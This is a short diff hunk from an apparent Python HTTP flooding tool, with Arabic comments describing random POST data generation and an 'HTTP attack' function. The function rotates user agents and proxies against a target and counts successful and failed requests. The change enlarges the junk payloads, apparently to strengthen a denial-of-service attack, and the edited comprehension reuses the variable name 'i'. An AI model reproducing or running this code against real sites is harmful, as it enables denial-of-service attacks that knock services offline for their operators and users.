@@ -27,9 +27,9 @@ print(f'''
 ua = UserAgent()
 
 # توليد بيانات POST عشوائية
-def random_post_data(length=10):
+def random_post_data(length=50):
     letters = string.ascii_letters + string.digits
-    return {f'param_{i}': ''.join(random.choice(letters) for _ in range(length)) for i in range(1, 4)}
+    return {f'param{i}': ''.join(random.choice(letters) for i in range(length)) for i in range(1, 11)}
 
 # هجوم HTTP مع عداد للطلبات الناجحة والفاشلة
 async def http_attack(target, proxy=None, method="GET", headers=None, success_counter=None, failure_counter=None):
